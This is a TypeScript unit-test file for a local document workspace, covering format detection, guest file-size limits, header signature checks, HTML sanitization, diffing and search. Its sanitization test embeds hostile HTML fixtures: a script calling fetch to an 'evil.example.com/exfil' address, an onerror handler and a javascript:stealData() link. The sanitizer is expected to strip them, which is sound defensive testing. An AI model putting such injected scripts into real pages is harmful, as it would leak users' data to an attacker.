import test from 'node:test';
import assert from 'node:assert/strict';
import {
  GUEST_MAX_FILE_BYTES,
  validateDocumentImport,
  detectDocumentFormat,
  validateBinarySignature,
  sanitizeDocumentHtml,
  computeDocumentDiff,
  searchLocalDocuments,
  formatByteSize,
} from './documentRules';
import type { LocalDocumentRecord } from '../types/workspace';

test('detectDocumentFormat identifies all required local formats accurately', () => {
  assert.equal(detectDocumentFormat('architecture-spec.pdf'), 'pdf');
  assert.equal(detectDocumentFormat('contract-v2.DOCX'), 'docx');
  assert.equal(detectDocumentFormat('board-deck.pptx'), 'pptx');
  assert.equal(detectDocumentFormat('q4-ledger.xlsx'), 'xlsx');
  assert.equal(detectDocumentFormat('metrics.csv'), 'csv');
  assert.equal(detectDocumentFormat('readme.txt'), 'txt');
  assert.equal(detectDocumentFormat('diagram.png'), 'image');
  assert.equal(detectDocumentFormat('malware.exe'), 'unknown');
});

test('validateDocumentImport enforces 30 MB guest per-file limit and allows local pro override', () => {
  const twentyNineMb = 29 * 1024 * 1024;
  const thirtyOneMb = 31 * 1024 * 1024;

  const validGuest = validateDocumentImport('report.pdf', twentyNineMb, false);
  assert.equal(validGuest.allowed, true);
  assert.equal(validGuest.format, 'pdf');

  const boundaryGuest = validateDocumentImport('boundary.docx', GUEST_MAX_FILE_BYTES, false);
  assert.equal(boundaryGuest.allowed, true);

  const exceededGuest = validateDocumentImport('huge-dataset.xlsx', thirtyOneMb, false);
  assert.equal(exceededGuest.allowed, false);
  assert.equal(exceededGuest.isGuestLimitExceeded, true);
  assert.match(exceededGuest.reason ?? '', /30\.0 MB Guest Local Processing Limit/);

  const allowedPro = validateDocumentImport('huge-dataset.xlsx', thirtyOneMb, true);
  assert.equal(allowedPro.allowed, true);
});

test('validateBinarySignature detects corrupted PDF and OOXML headers gracefully', () => {
  const validPdfBytes = new TextEncoder().encode('%PDF-1.7\n1 0 obj');
  assert.equal(validateBinarySignature('pdf', validPdfBytes).valid, true);

  const corruptedPdfBytes = new TextEncoder().encode('NOT_A_PDF_HEADER');
  const badPdf = validateBinarySignature('pdf', corruptedPdfBytes);
  assert.equal(badPdf.valid, false);
  assert.match(badPdf.error ?? '', /Corrupted PDF header/);

  const validZipBytes = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00]);
  assert.equal(validateBinarySignature('docx', validZipBytes).valid, true);

  const corruptedDocxBytes = new Uint8Array([0x00, 0x01, 0x02, 0x03]);
  const badDocx = validateBinarySignature('docx', corruptedDocxBytes);
  assert.equal(badDocx.valid, false);
  assert.match(badDocx.error ?? '', /Corrupted DOCX container/);
});

test('sanitizeDocumentHtml neutralizes scripts, inline macros, and unsolicited external requests', () => {
  const untrusted = `
    <div>
      <h1>Quarterly Review</h1>
      <script>fetch("https://evil.example.com/exfil")</script>
      <img src="https://tracker.example.com/pixel.png" onerror="alert(1)" />
      <a href="javascript:stealData()">Click Macro</a>
      <a href="https://external.example.com/doc">External Ref</a>
    </div>
  `;

  const result = sanitizeDocumentHtml(untrusted);
  assert.ok(!result.sanitizedHtml.includes('<script>'));
  assert.ok(!result.sanitizedHtml.includes('onerror='));
  assert.ok(!result.sanitizedHtml.includes('https://tracker.example.com/pixel.png'));
  assert.ok(result.macrosNeutralized >= 3);
  assert.equal(result.networkRequestsBlocked, 1);
  assert.equal(result.externalLinksSanitized, 1);
});

test('computeDocumentDiff calculates line and structural section deltas', () => {
  const docA = {
    id: 'doc-a',
    extractedText: 'Clause 1: Local storage only.\nClause 2: Zero cloud uploads.\nClause 3: Legacy draft.',
    sections: [
      { id: 's1', title: 'Privacy Architecture', level: 1 as const, kind: 'title' as const },
      { id: 's2', title: 'Legacy Clause', level: 2 as const, kind: 'section' as const },
    ],
  };
  const docB = {
    id: 'doc-b',
    extractedText: 'Clause 1: Local storage only.\nClause 2: Zero cloud uploads.\nClause 3: Updated OPFS engine.',
    sections: [
      { id: 's1', title: 'Privacy Architecture', level: 1 as const, kind: 'title' as const },
      { id: 's3', title: 'OPFS Persistence', level: 2 as const, kind: 'section' as const },
    ],
  };

  const diff = computeDocumentDiff(docA, docB);
  assert.equal(diff.unchangedCount, 2);
  assert.equal(diff.modifiedCount, 1);
  assert.deepEqual(diff.sectionDelta.shared, ['Privacy Architecture']);
  assert.deepEqual(diff.sectionDelta.onlyInA, ['Legacy Clause']);
  assert.deepEqual(diff.sectionDelta.onlyInB, ['OPFS Persistence']);
});

test('searchLocalDocuments finds matches across titles, structural sections, and content', () => {
  const sampleDoc: LocalDocumentRecord = {
    id: 'd-1',
    name: 'Zero-Trust-Specification.pdf',
    format: 'pdf',
    mimeType: 'application/pdf',
    sizeBytes: 102400,
    importedAt: '2026-11-14T10:00:00Z',
    lastOpenedAt: '2026-11-14T10:00:00Z',
    folderCategory: 'architecture',
    status: 'ready',
    extractedText: 'All documents remain on the user device using IndexedDB and OPFS.',
    pageCount: 3,
    sections: [
      {
        id: 'sec-opfs',
        title: 'OPFS Storage Engine',
        level: 2,
        kind: 'section',
        previewText: 'Origin Private File System local persistence.',
      },
    ],
    privacyAudit: {
      networkRequestsBlocked: 0,
      macrosNeutralized: 0,
      externalLinksSanitized: 0,
      executedInWebWorker: true,
      localPersistenceEngine: 'IndexedDB + OPFS',
      sha256Fingerprint: 'abc1234',
      unsupportedFeatures: [],
    },
    benchmark: {
      engineName: 'PDF.js v5 Adapter',
      parseDurationMs: 14,
      renderDurationMs: 22,
      memoryEstimateMb: 4.2,
      fidelityScore: '99.4% Vector + Text Layer',
      license: 'Apache-2.0',
    },
  };

  const hits = searchLocalDocuments([sampleDoc], 'OPFS');
  assert.ok(hits.length >= 2);
  assert.equal(formatByteSize(1048576), '1.00 MB');
});
